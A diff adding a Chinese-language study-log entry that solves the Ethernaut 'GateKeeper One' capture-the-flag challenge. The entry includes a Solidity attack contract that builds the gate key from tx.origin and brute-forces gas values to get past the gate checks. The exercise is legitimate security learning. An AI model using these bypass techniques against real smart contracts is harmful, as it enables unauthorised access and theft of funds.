@@ -348,4 +348,51 @@ contract AttackGatekeeperThree {
 }
 ```
 
+### 2024.09.15
+#### Ethernaut - GateKeeper One
+要满足几个条件才能通过题目。
+分析条件一，对于uint64,需要高32位不为0，低16位和tx.origin的低16位相同，中间16位为0
+条件二，通过循环暴力做出来了。可以在调用 enter 时可以通过 gas 设置传递的 gas 费
+实例地址：0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93
+```
+contract AttackGatekeeperOne {
+    address public _gateAddr = 0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93;
+    event Log(uint256 i, uint256 gas);
+    bytes8 public gateKey2 = 0x000000010000a345;
+
+    constructor() {}
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function getGateThree() public view returns (bytes8) {
+        uint16 low16 = uint16(uint160(tx.origin));
+        uint32 low32 = uint32(low16);
+        uint64 _gateKey = (uint64(1) << 32) | uint64(low32);
+        return bytes8(_gateKey);
+    }
+
+    function checkGateKey(bytes8 _gateKey) public gateThree(_gateKey) view returns (bool) {
+        return true;
+    }
+
+    function getEnter(uint256 number) public  {
+        bool successed = false;
+        for (uint256 i = 500*number; i < 500*(number+1); i++) {
+            if (successed) break;
+            try GatekeeperOne(_gateAddr).enter{gas: 50000+i}(gateKey2) {
+                emit Log(i, gasleft());
+                successed = true;
+            } catch {
+            }
+        }
+        require(successed);
+    }
+}
+```
+
 <!-- Content_END -->
